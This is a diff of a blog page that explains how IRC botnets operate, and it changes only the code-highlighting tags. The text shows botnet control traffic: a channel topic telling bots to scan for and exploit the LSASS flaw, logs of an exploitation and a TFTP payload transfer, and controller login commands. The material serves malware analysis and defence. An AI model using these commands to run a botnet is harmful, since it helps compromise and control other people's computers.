@@ -28,13 +28,13 @@ Afterwards, the server accepts the bot as a client and sends him RPL_ISUPPORT, R
 
 On RPL_ENDOFMOTD or ERR_NOMOTD, the bot will try to join his master's channel with the provided password:
 
-{% highlight shell %}
+{% highlight irc %}
 -> JOIN #botnet channelpassword
 -> MODE [urX]-700159 +x
 {% endhighlight %}
 
 The bot receives the topic of the channel and interprets it as a command:
-{% highlight shell %}
+{% highlight irc %}
 <- :irc1.XXXXXX.XXX 332 [urX]-700159 #botnet :.advscan lsass 200 5 0 -r -s
 <- :[urX]-700159!mltfvt@nicetry JOIN :#botnet
 <- :irc1.XXXXXX.XXX MODE #botnet +smntuk channelpassword
@@ -50,14 +50,14 @@ Upon successful exploitation the bot will message the owner about it, if it has 
 
 *Reference* [LSASS vulnerability](https://technet.microsoft.com/library/security/ms04-011)[1]
 
-{% highlight irssi %}
+{% highlight irc %}
 -> PRIVMSG #botnet :[lsass]: Exploiting IP: 200.124.175.XXX
 -> PRIVMSG #botnet :[TFTP]: File transfer started to IP: 200.124.175.XXX (C:\WINDOWS\System32\NAV.exe).
 {% endhighlight %}
 
 Then the IRC server (also called IRC daemon, abbreviated IRCd) will provide the channels userlist. But most botnet owners have modified the IRCd to just send the channel operators to save traffic and disguise the number of bots in the channel.
 
-{% highlight shell %}
+{% highlight irc %}
 <- :irc1.XXXXXX.XXX 353 [urX]-700159 @ #botnet :@JAH
 <- :irc1.XXXXXX.XXX 366 [urX]-700159 #botnet :End of /NAMES list.
 <- :irc1.XXXXXX.XXX NOTICE [urX]-700159 :BOTMOTD File not found
@@ -66,7 +66,7 @@ Then the IRC server (also called IRC daemon, abbreviated IRCd) will provide the 
 
 The controller of a botnet has to authenticate himself to take control over the bots. This authentication is done with the help of a command prefix and the "auth" command. The command prefix is used to login the master on the bots and afterwards he has to authenticate himself. For example,
 
-{% highlight shell %}
+{% highlight irc %}
 .login leet0
 .la plmp -s
 {% endhighlight %}
@@ -74,7 +74,7 @@ The controller of a botnet has to authenticate himself to take control over the 
 
 are commands used on different bots to approve the controller. Again, the "-s" switch in the last example tells the bots to be silent when authenticating their master. Else they reply something like
 
-{% highlight shell %}
+{% highlight irc %}
 [MAIN]: Password accepted.
 [r[X]-Sh0[x]]: .:( Password Acepted ):. .
 {% endhighlight %}
